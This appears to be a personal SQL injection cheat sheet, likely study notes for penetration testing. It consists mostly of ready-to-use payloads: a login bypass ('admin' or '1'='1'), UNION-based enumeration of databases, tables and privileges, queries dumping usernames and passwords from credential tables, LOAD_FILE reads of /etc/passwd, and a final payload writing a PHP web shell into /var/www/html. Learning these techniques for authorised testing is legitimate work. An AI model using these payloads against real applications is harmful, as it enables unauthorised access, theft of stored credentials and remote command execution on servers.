#sql-injection 
## SQLi Discovery

|Payload|URL Encoded|
|---|---|
|`'`|`%27`|
|`"`|`%22`|
|`#`|`%23`|
|`;`|`%3B`|
|`)`|`%29`|
## SIMPLE INJECTION
#bypass-login
_OR INJECTION_
in this case it used for bypass simple login logic.
```sql
admin' or '1'='1
```

This works because we can inject directly in this query without *sanitization*.
```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

> [!NOTE] Note
> The payload we used above is one of many auth bypass payloads we can use to subvert the authentication logic. You can find a comprehensive list of SQLi auth bypass payloads in [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass), each of which works on a certain type of SQL queries.

# Union Injection
#union-based
## Determinate number of columns
_ORDER BY Method_
```sql
' order by <number for find column>-- -
```

_UNION_
```sql
cn' UNION select 1,2,3-- - # find 3 column in this case
```

_Location of Injection_
```sql
cn' UNION select 1,@@version,3,4-- - # get version
cn' UNION select 1,user(),3,4-- - # get user owner 
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

_Show all database_
```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- - all db
cn' UNION select 1,database(),2,3-- -  db run by webapp
```

_Extract the data table from the current database_
```sql
1' and 1=2 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema = database() -- -
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

_Extract column name from table name we are select_
```sql
1' and 1=2 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema = database() and table_name ='user'-- -
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

_Extract sensitive data from table_
```sql
1' and 1=2 union select 1,group_concat(username,0x3a,password),3,4 from user-- -
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```
# Database Enumeration
## Mysql
#mysql #enumeration

|Payload|When to Use|Expected Output|Wrong Output|
|---|---|---|---|
|`SELECT @@version`|When we have full query output|MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`'|In MSSQL it returns MSSQL version. Error with other DBMS.|
|`SELECT POW(1,1)`|When we only have numeric output|`1`|Error with other DBMS|
|`SELECT SLEEP(5)`|Blind/No Output|Delays page response for 5 seconds and returns `0`.|Will not delay response with other DBMS|
_FIND ALL DATABASE_
```sql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

_Determinate user and privilege_
```sql
SELECT USER() -- get user
SELECT CURRENT_USER() -- get user
SELECT user from mysql.user -- get user
```

_User Privileges_
```sql
SELECT super_priv FROM mysql.user -- check super admin privilage
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- - show privileges for our corrent user
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- - dump all privileges
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- - for specific user
```
## Load File
```sql
SELECT LOAD_FILE('/etc/passwd');
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```
## Write File
```sql
SHOW VARIABLES LIKE 'secure_file_priv'; -- view if variable isn't set if true we can read at all if none we cannot read any
```

```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv" -- whit select
```

_Union Select_
```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

_Dump Data_
```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

_Write Web Shell_
```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

